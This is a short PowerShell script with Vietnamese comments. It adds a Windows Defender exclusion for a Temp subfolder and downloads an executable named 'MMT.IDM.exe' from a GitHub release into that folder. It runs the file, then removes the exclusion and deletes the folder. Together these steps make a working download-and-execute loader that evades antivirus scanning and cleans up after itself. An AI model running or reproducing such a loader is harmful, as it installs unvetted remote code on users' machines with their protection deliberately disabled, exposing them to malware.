# Đường dẫn thư mục
$TempFolder = "$env:LOCALAPPDATA\Temp\MMTPC"
$ExePath = Join-Path $TempFolder "MMT.IDM.exe"
$Url = "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe"

# 1. Tạo thư mục MMTPC
if (!(Test-Path $TempFolder)) {
    New-Item -ItemType Directory -Path $TempFolder | Out-Null
}

# 2. Thêm exclusion cho Windows Defender
Add-MpPreference -ExclusionPath $TempFolder

# 3. Tải file về
Invoke-WebRequest -Uri $Url -OutFile $ExePath

# 4. Chạy file và chờ nó đóng
Start-Process -FilePath $ExePath -Wait

# 5. Xoá exclusion
Remove-MpPreference -ExclusionPath $TempFolder

# 6. Xoá thư mục MMTPC
Remove-Item -Path $TempFolder -Recurse -Force
